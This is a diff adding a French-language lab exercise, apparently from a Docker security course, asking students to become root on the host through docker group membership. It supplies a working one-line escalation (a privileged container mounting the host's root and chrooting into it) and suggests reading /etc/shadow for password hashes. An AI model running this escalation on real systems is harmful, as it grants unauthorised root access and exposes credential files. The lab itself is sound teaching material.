@@ -161,3 +161,13 @@ networks:
   my-network:
     driver: bridge
 ```
+
+🌞 Prouvez que vous pouvez devenir root
+- en étant membre du groupe docker
+
+- sans taper aucune commande sudo ou su ou ce genre de choses
+normalement, une seule commande docker run suffit
+pour prouver que vous êtes root, plein de moyens possibles
+  - par exemple un cat /etc/shadow qui contient les hash des mots de passe de la machine hôte
+
+`docker run -it --privileged --net host --ipc=host -v /:/host alpine chroot /host`
